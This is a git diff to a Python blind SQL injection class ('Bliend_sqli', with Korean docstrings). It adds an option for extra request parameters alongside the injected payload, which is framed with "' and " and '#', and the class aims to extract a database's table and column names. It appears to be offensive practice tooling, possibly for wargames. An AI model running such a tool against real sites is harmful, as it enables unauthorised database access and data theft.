@@ -26,7 +26,7 @@ class Bliend_sqli():
         table_name(list[str]): 사용중인 DB의 Table 명
         column_name(dict[str:list]): 사용중인 DB의 컬럼명
     """
-    def __init__(self, url:str, query:str, signature:str, sql_starter:str = "' and ", sql_ender:str = "#", cookie:dict[str:str] = {}, req:str = "G"): 
+    def __init__(self, url:str, query:str, signature:str, sql_starter:str = "' and ", sql_ender:str = "#", cookie:dict[str:str] = {}, req:str = "G", para:list = []): 
         """
         Bliend_sqli class의 __init__ method
         Args:
@@ -37,6 +37,7 @@ class Bliend_sqli():
             query(str): SQL취약점의 URL쿼리 매개변수 명
             cookie(dict[str:str]): 요청 쿠키. 기본값 {}
             req(str): 요청 방식 GET or Post. (G)/P
+            para(list): [str] 형식으로 파라미터 이름과 값을 =을 통해서 입력. (EX: ["id=kaya", "pw=password"])
         """
         # 매개변수를 번수 선언 및 정의
         self.url = url
@@ -46,6 +47,7 @@ class Bliend_sqli():
         self.cookie = cookie
         self.query = query
         self.req = req
+        self.para = para
 
     def _sqli_req(self, sql_query: str) -> object:
         """
@@ -58,6 +60,11 @@ class Bliend_sqli():
         sql = self.sql_starter + sql_query + self.sql_ender
                         
         url_query = {self.query:sql}
+
+        
+        for i in self.para:
+            tmp = i.split("=")
+            url_query[tmp[0]] = tmp[1]
 
         # request 전송
 
